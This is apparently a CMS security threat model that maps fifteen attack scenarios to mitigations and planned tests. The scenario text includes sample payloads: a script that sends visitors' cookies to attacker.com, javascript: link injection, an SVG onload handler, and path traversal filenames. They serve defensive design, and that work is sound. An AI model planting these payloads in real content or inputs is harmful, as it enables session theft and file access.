# CMS_SECURITY_REVIEW.md — Security Review & Threat Analysis

**Project:** VOIDTECH SOLUTION  
**Milestone:** Phase 10.0.2 — Final CMS Implementation Safeguards  
**Document Status:** FROZEN SECURITY SPECIFICATION & SAFEGUARDS [DESIGN FREEZE]  
**Author:** Google DeepMind Assistant  
**Approved By:** SHIVANSHU SATYAJEET (Project Owner) — Safeguards Authorized  

---

## 1. Executive Summary & Security Boundary

The introduction of an Administrative Content Management System (CMS) introduces external user-controlled content into public-facing pages, requiring rigorous threat analysis and defense-in-depth controls. 

*Statement of Verification Scope:* This document reflects an **architectural security analysis and threat modeling review**. No active penetration testing or live exploitation was conducted during Phase 10.0, 10.0.1, or 10.0.2.

---

## 2. In-Depth Threat Matrix (15 Explicit Scenarios)

### 1. Draft Content Leakage & Boundary Breach (Safeguard 1)
- **Attack Scenario:** External crawler or competitor requests draft URLs (e.g. `/services/unreleased-ai-agent`) or attempts SQL parameter guessing to read unreleased product roadmaps or draft revisions.
- **Impact:** Commercial reconnaissance, leaked pricing strategies, reputational damage.
- **Mitigation:** Dual-pointer separation (`currentPublishedRevisionId` vs `currentWorkingRevisionId`). Public repositories query exclusively `WHERE publicationStatus = 'PUBLISHED' AND isActive = true`. Unpromoted working drafts reside strictly in `content_revisions` separate from public tables.
- **Verification Test (SEC-05):** Automated integration test attempts to fetch draft slug anonymously; verifies HTTP 404 response.

### 2. Stored Cross-Site Scripting (XSS) via Rich Text (Decision 6)
- **Attack Scenario:** Malicious administrator or compromised account inputs `<script>fetch('https://attacker.com/cookie?c='+document.cookie)</script>` inside service descriptions.
- **Impact:** Session hijacking of public visitors and other administrators viewing the site.
- **Mitigation:** Server-side GFM parsing pipeline via `unified` + `rehype-sanitize`. Strips all `<script>`, `<object>`, `<embed>`, `<iframe>`, and event attributes (`onload`, `onclick`).
- **Verification Test (SEC-02):** Unit test inputs XSS payload; verifies output HTML contains zero `<script>` or event handlers.

### 3. Markdown Injection & Protocol Abuse (Decision 6)
- **Attack Scenario:** Author inputs `[Click Here](javascript:alert(1))` or `[Data](data:text/html;base64,...)` into service deliverables.
- **Impact:** Execution of arbitrary client-side code on user click.
- **Mitigation:** `rehype-sanitize` enforces protocol whitelisting (`http:`, `https:`, `mailto:`, `tel:`). Strips `javascript:` and `data:` schemes.
- **Verification Test (SEC-02):** Unit test asserts `javascript:` links are sanitized to `#` or removed.

### 4. Unsafe External Links (Reverse Tabnabbing) (Decision 6)
- **Attack Scenario:** Content author links to external malicious site that uses `window.opener.location` to hijack user's open tab.
- **Impact:** Phishing attacks targeting VOIDTECH clients.
- **Mitigation:** Pipeline automatically applies `rel="noopener noreferrer"` and `target="_blank"` on all external URLs.
- **Verification Test:** Automated test verifies rendered anchor tags contain `rel="noopener noreferrer"`.

### 5. Unauthorized Publishing (Privilege Escalation) (Safeguard 3)
- **Attack Scenario:** An authenticated `EDITOR` attempts to invoke `publishRevisionAction` or `publishServiceAction` directly.
- **Impact:** Unreviewed, unapproved copy published directly to the public live website.
- **Mitigation:** Step 2 of the 9-Step Publishing Transaction checks `requirePermission(user, "services:publish")` server-side, returning `AuthorizationError` (`403 Forbidden`).
- **Verification Test (SEC-01):** Test suite executes action as `EDITOR`; asserts `success: false` and `FORBIDDEN` error code.

### 6. Pricing Manipulation & Commercial Fraud (Decision 7)
- **Attack Scenario:** An editor attempts to modify package pricing in INR or activate unapproved discounts on `/pricing`.
- **Impact:** Direct commercial and financial loss.
- **Mitigation:** `pricing:publish`, `pricing:archive`, and `pricing:restore` are restricted strictly to `SUPER_ADMIN` and `ADMIN`. Editor is limited to `pricing:edit_draft`. Step 2 of publish transaction rejects unauthorized roles.
- **Verification Test (SEC-13):** Test suite attempts price publish as `EDITOR`; verifies mutation rejection with `403 Forbidden`.

### 7. Testimonial Fabrication & Consumer Protection Violations (Safeguard 4)
- **Attack Scenario:** Administrator creates fake client quotes or fictitious enterprise endorsements.
- **Impact:** False advertising liability, violation of Indian consumer protection laws.
- **Mitigation:** Mandatory multi-precondition check: `verificationStatus === 'VERIFIED'`, `verifiedById !== null`, `clientConsentStatus === 'GRANTED'`, `clientConsentRecordedAt !== null`, and `consentEvidenceUrl !== null`.
- **Verification Test (SEC-08):** Database query test asserts unverified or unconsented testimonial is excluded from public output with `412 Precondition Failed`.

### 8. Consent Revocation Latency (Safeguard 4)
- **Attack Scenario:** Client requests withdrawal of their endorsement or logo, but content remains cached at edge CDN or returned by database queries.
- **Impact:** Breach of consent agreement, legal exposure.
- **Mitigation:** `revokeTestimonialConsentAction` atomically sets `clientConsentStatus = "REVOKED"`, `status = "ARCHIVED"`, `isActive = false`, and purges CDN tags. Public queries enforce `clientConsentStatus = 'GRANTED'`, guaranteeing immediate database-level exclusion independent of CDN invalidation latency.
- **Verification Test (SEC-08):** Integration test confirms revoking consent instantly unlists the record at the SQL layer.

### 9. Malicious File Upload & Remote Code Execution (RCE) (Safeguard 5)
- **Attack Scenario:** Attacker uploads `exploit.php` or executable binary renamed as `image.png`.
- **Impact:** Server compromise, arbitrary code execution.
- **Mitigation:**
  1. Magic-byte sniffing inspects initial buffer bytes directly (`FF D8 FF`, `89 50 4E 47`, `52 49 46 46`).
  2. Sharp re-encodes raster images, stripping embedded executable payloads, EXIF metadata, and comments.
  3. Files are stored with cryptographically generated UUID keys (`uploads/YYYY/MM/[uuid].webp`).
- **Verification Test (SEC-09):** Upload test supplies polyglot executable with `.png` extension; asserts rejection at magic-byte gate with `400 Bad Request`.

### 10. SVG-Based Stored XSS & XML External Entity (XXE) (Safeguard 5)
- **Attack Scenario:** Uploading an SVG containing `<svg onload="alert(1)">`, `<script>`, or external XML entities.
- **Impact:** XSS execution when SVG is served or viewed directly.
- **Mitigation:** SVG uploads are **hard-disabled by default** in the initial implementation. Re-enabling SVG in a future milestone will require a dedicated DOMPurify XML profile sanitizer and passing penetration tests.
- **Verification Test (SEC-03):** Upload test attempts SVG upload; verifies default rejection with `400 Bad Request ("SVG uploads are disabled by default")`.

### 11. Path Traversal File System Attacks (Safeguard 5)
- **Attack Scenario:** Supplying filenames like `../../../../etc/passwd` or `..\..\app\page.tsx`.
- **Impact:** Overwriting critical system files or unauthorized file access.
- **Mitigation:** Client filenames are discarded. Storage keys are generated strictly via UUID v4. Path normalization and `path.basename()` strip traversal characters. Writes are confined to local development storage roots. Ephemeral serverless storage is forbidden.
- **Verification Test (SEC-10):** Test uploads file with traversal characters; asserts target path on disk is confined within designated storage directory.

### 12. Cross-Item Revision Pointer Forgery (Safeguard 2)
- **Attack Scenario:** Attacker attempts to update `ContentItem.currentPublishedRevisionId` pointing to a revision belonging to a completely different content item.
- **Impact:** Cross-entity content corruption, display of wrong content or sensitive data under incorrect slug.
- **Mitigation:** Step 4 of the 9-Step Publishing Transaction verifies `workingRevision.contentItemId === contentItem.id`. PostgreSQL trigger `verify_revision_ownership()` enforces this in database DDL.
- **Verification Test (SEC-04):** Integration test attempts assigning mismatched revision; verifies transaction aborts and rolls back.

### 13. Concurrent Publishing Collisions & OCC Drift (Safeguard 3)
- **Attack Scenario:** Two administrators simultaneously publish different revisions of the same service.
- **Impact:** Race condition, inconsistent materialized state, corrupted public listings.
- **Mitigation:** Publishing runs inside a serializable PostgreSQL transaction (`prisma.$transaction`) with atomic OCC checks on `expectedVersion`.
- **Verification Test (SEC-04):** Concurrency test simulates concurrent publishes; verifies one succeeds and the other raises `CONFLICT_DETECTED` (409) with visual diff resolution.

### 14. Ephemeral Serverless Storage Data Loss (Safeguard 5)
- **Attack Scenario:** Production environment stores uploaded media in serverless container filesystem (`/tmp`).
- **Impact:** Permanent media loss upon container recycle or scale-down, resulting in broken image links.
- **Mitigation:** Ephemeral serverless storage is explicitly prohibited in production specifications. Local filesystem storage is restricted to development. Cloudflare R2 remains the future persistent production target (deferred with zero current credentials).
- **Verification Test:** Architectural check verifies zero writes to serverless ephemeral paths.

### 15. Silent Stale Content Presentation on Fallback (Safeguard 6)
- **Attack Scenario:** System experiences database disruption; stale static data is served silently without diagnostic disclosure, confusing administrators and users.
- **Impact:** Editorial confusion, unmonitored silent database failures.
- **Mitigation:** Repositories emit `X-Voidtech-Content-Source: static-fallback` and `isFallback: true`. Fallback is NEVER applied to archived items (which return 404). Structured logs record fallback events with scrubbed secrets.
- **Verification Test (SEC-12):** Database disconnect test confirms response includes fallback headers and structured diagnostic logs.

---

## 3. CodeRabbit Status & Compensating Controls

- **Status:** CodeRabbit CLI v1.4.4 is installed but currently unauthenticated (`signed out`) in this offline autonomous environment.
- **Compensating Controls:** A manual, exhaustive threat review across all 15 vectors was completed. Every mitigation is mapped to a concrete automated verification test planned for Phase 10.1 and Phase 10.4.
